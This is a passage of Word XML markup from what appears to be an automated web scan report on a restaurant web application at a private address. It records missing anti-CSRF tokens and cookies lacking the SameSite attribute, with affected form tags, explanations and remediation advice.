      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="06CD1016" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="558913E5" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="08AB5FC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3EED1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7BF8DBF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http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="151CB07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https://owasp.org/www-community/Security_Headers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6454307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1867A9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0F199A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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="368FBE4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CD4337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43C6A4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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="21710739"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3831E1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1826BE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082EDB05"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22F371C7" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="089502F8"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Low (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="579FA7C1"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Absence of Anti-CSRF Tokens</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="39FB250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060B0E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486EED4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No Anti-CSRF tokens were found in a HTML submission form.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="629082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 cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CEEF2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CSRF attacks are effective in a number of situations, including:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55EB96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 The victim has an active session on the target site.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A0791C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 The victim is authenticated via HTTP auth on the target site.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F702B9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 The victim is on the same local network as the target site.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D448D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CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="262A411C" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72C90DFB" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="45B4B3D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E108A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B9BDE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http://192.168.1.20/admin/messages.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4EF5FEF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0640D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97740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01C59C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E42BA8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0FA5F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id="messageForm" name="messageForm" method="post" action="message-exec.php" onsubmit="return messageValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4D1B1A3B"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AADC1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6DB7B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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="33AD159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3CA19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B33F79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30CBC7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22509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97AB2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id="loginForm" name="loginForm" method="post" action="login-exec.php" onsubmit="return loginValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6246EBB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AA605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URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E237B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5EBAB4C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5CEC2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7F721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E19C84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BB608C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17C06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name="ratingForm" id="ratingForm" action="ratings-exec.php" method="post" onsubmit="return ratingsValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3AB83FA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E25686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C22B6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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7F69A19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96EAC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5D9CB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9CDED2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6A1E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C281C2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id="loginForm" name="loginForm" method="post" action="login-exec.php" onsubmit="return loginValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7819CF6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C1090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27F48D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http://192.168.1.20/login-register.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7485ECF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136427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9A185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AF0D51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0E1AC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CA5AD2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id="loginForm" name="loginForm" method="post" action="register-exec.php" onsubmit="return registerValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="11F43B0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42C7D8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9D741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http://192.168.1.20/admin/profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="74176B9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18A0B2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7DAE88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7EBC38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18682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04667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id="staffForm" name="staffForm" method="post" action="staff-exec.php" onsubmit="return staffValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2021875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AB7C94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7B2C44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http://192.168.1.20/foodzone.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2E912FF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15174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CF92F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2A5B666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E92A9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61478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name="categoryForm" id="categoryForm" method="post" action="foodzone.php" onsubmit="return categoriesValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1278655B"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F7346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46DC70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http://192.168.1.20/member-profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="182CAA6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FD50E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B9758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3FA963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4913BE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2B4FA7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action="changepicture.php" id="form" enctype="multipart/form-data" role="form" method="POST"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3863AEF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F6222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2DF379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1B3DBE5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3CD64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FF6699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FC68D0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BBEC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66A86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name="tableForm" id="tableForm" action="tables-exec.php" method="post" onsubmit="return tablesValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5A393FC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F1C62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F0C698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http://192.168.1.20/login-register.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2056AD0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1517A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DD786A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0429B8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838F4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C0328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id="loginForm" name="loginForm" method="post" action="login-exec.php" onsubmit="return loginValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7F77E19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65507D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71BC59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http://192.168.1.20/admin/profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="491FBDE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516061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8F48F0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F00101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1C465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67FC6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id="updateForm" name="updateForm" method="post" action="update-exec.php?id=1" onsubmit="return updateValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="45B96A2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076754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B7E42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http://192.168.1.20/index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1659870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52959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E61BB4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2F5FD7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39EE0C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Evidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="012211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id="loginForm" name="loginForm" method="post" action="login-exec.php" onsubmit="return loginValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3C72A6F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20A7A5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704C12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http://192.168.1.20/member-profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="514329C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57BFD7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0B881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2E0C7B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8A578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F163A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id="updateForm" name="updateForm" method="post" action="Changepassword.php?id=18" onsubmit="return updateValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="027B4DA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45A4A8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6E962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http://192.168.1.20/admin/allocation.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7178228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F5EF2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88856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9CC007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8D1D6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530522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id="ordersAllocationForm" name="ordersAllocationForm" method="post" action="orders-allocation.php" onsubmit="return ordersAllocationValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0725792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23A1F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ADD4ED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708DDD1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3A57C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EAF925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86DA2A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D685C4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7A8F93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name="partyhallForm" id="partyhallForm" action="partyhalls-exec.php" method="post" onsubmit="return partyhallsValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3BB70A7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104A0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98D45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http://192.168.1.20/cart.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="09B3C56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1A350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07027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FB8441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0A8E9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B1CEC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name="quantityForm" id="quantityForm" method="post" action="update-quantity.php" onsubmit="return updateQuantity(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2F8295E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B17E8D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F4D31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http://192.168.1.20/admin/categories.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="390C287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FBD186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45E19A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DA725E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27A1C0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192F3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name="categoryForm" id="categoryForm" action="categories-exec.php" method="post" onsubmit="return categoriesValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="10FFDAC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064CA9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5BD7A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0AF6CCE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277E1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C0084E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21FB88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91FD55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54779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name="quantityForm" id="quantityForm" action="delete-quantity.php" method="post" onsubmit="return quantitiesValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="157FC69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5F6CF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88F1E0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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="282AA9E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1F347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D0086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D09D1E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7C4D14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49E03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id="loginForm" name="loginForm" method="post" action="register-exec.php" onsubmit="return registerValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2978CFE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CC72C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FFDDF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1909F35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ACD5F9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3D7CE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7FD27D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DCA1A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3D6DCA7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&lt;form name="currencyForm" id="currencyForm" action="currencies-exec.php" method="post" onsubmit="return currenciesValidate(this)"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="77E9DE9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5EE89E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2B2CFC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46</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="79C603BE"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20D3C9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30D96E4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Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="206961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Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05DAE46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 example, use anti-CSRF packages such as the OWASP CSRFGuard.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3978E37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Implementation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DBC02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Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60B355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Architecture and Design</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AF6D1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Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49D7DD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Note that this can be bypassed using XSS.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7965D6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Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52D06D0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Note that this can be bypassed using XSS.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20F2D4D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Use the ESAPI Session Management control.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EDC4A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This control includes a component for CSRF.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04277B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Do not use the GET method for any request that triggers a state change.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79C03B0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Phase: Implementation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EA4F7D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Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2B21952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C8A992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Other information</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C21E38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No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret] was found in the following HTML form: [Form 1: "subject" "Submit" "Reset" ].</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7D18215D" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="426378A5" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6C9EFE94"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1C4DB4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181E162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http://projects.webappsec.org/Cross-Site-Request-Forgery</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5545AA3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http://cwe.mitre.org/data/definitions/352.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0551DB69"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A99595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580650A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352</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6357A9C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05B077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2F3A1C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9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="42CB492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51A64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50936D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0BC2A801"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2820506A" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45B3D660"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Low (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F33FA91"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Cookie Without SameSite Attribute</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="50C1F08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AB9ADC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404C78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 cookie has been set without the SameSite attribute, which means that the cookie can be sent as a result of a 'cross-site' request. The SameSite attribute is an effective counter measure to cross-site request forgery, cross-site script inclusion, and timing attacks.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6F118796" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B34AE5A" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1E8E54E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E8B7DF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86CBC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http://192.168.1.20/member-index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3A8C87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55BA33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7906C0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819943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C3466B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1557F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40D4C46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857079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1DCC473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7B98876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D7F587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971BE2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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="751BEFE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58E6A5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3920D7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351337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BCFC1B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C4878D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568B6C3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D2F2D6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75EE6AF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6E90505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DC2461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107428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http://192.168.1.20/admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="296DE73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16814B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0F09A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DF75F8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4CABB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30642B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7A012BC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61770E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C52A7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229E767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9F954B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D34188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6931C6D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432C7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B0D52E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518C47D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5A7553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Parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F7E0B8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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0C0416E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DAD56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4DECAF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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0173B4B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3EEA6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573AA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6F1552F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EE9375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3FCAA1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5F887B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01C09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6E92EF7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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="101AF47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A7C0E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442C2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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3FCEBE4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52061B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651EB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515DFD1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65ADC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CC8E0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7FFCE2F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DC43B1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0C1AEC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0C3F3A2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39D4A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43625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09F987A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0A79FD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69AC16F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6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1F0FB25B"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4D5D28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59FB76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that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="17B16C84"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83A11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26C2BB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https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="24A4A68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C9CB48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72C5AD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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="10E33046"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B9488F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6C5841D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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7788DE3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6BFAC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324762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bookmarkEnd w:id="78"/>
    </w:tbl>
    <w:p w14:paraId="58C0DF5B"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0"/>
        <w:gridCol w:w="7350"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="56D6AA9E" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A459313"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Low (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A284B1E" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
